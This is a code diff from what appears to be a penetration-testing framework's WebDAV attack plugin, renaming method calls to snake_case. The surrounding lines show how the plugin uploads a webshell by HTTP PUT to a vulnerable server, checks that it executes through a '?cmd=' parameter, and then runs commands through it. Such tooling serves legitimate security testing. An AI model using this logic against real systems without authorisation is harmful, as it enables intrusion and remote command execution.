@@ -84,7 +84,7 @@ class dav(AttackPlugin):
         '''
         # Create the shell
         filename = rand_alpha(7)
-        extension = vuln_obj.getURL().getExtension()
+        extension = vuln_obj.get_url().get_extension()
 
         # I get a list of tuples with file_content and extension to use
         shell_list = shell_handler.get_webshells(extension)
@@ -96,7 +96,7 @@ class dav(AttackPlugin):
 
             # Upload the shell
             fname = '%s.%s' % (filename, extension)
-            url_to_upload = vuln_obj.getURL().urlJoin(fname)
+            url_to_upload = vuln_obj.get_url().url_join(fname)
 
             om.out.debug(
                 'Uploading file %s using PUT method.' % url_to_upload)
@@ -109,7 +109,7 @@ class dav(AttackPlugin):
             exploit_url = URL(url_to_upload + '?cmd=')
             response = self._uri_opener.GET(exploit_url)
 
-            if shell_handler.SHELL_IDENTIFIER in response.getBody():
+            if shell_handler.SHELL_IDENTIFIER in response.get_body():
                 msg = 'The uploaded shell returned the SHELL_IDENTIFIER, which'\
                       ' verifies that the file was uploaded and is being executed.'
                 om.out.debug(msg)
@@ -120,7 +120,7 @@ class dav(AttackPlugin):
                       ' the SHELL_IDENTIFIER, which means that the file was not'\
                       ' uploaded to the remote server or the code is not being'\
                       ' run. The returned body was: "%s".' % (extension,
-                                                              response.getBody())
+                                                              response.get_body())
                 om.out.debug(msg)
                 extension = ''
 
@@ -166,7 +166,7 @@ class DAVShell(exec_shell):
         to_send = self.get_exploit_URL() + command
         to_send = URL(to_send)
         response = self._uri_opener.GET(to_send)
-        return shell_handler.extract_result(response.getBody())
+        return shell_handler.extract_result(response.get_body())
 
     def end(self):
         url_to_del = self._exploit_url.uri2url()
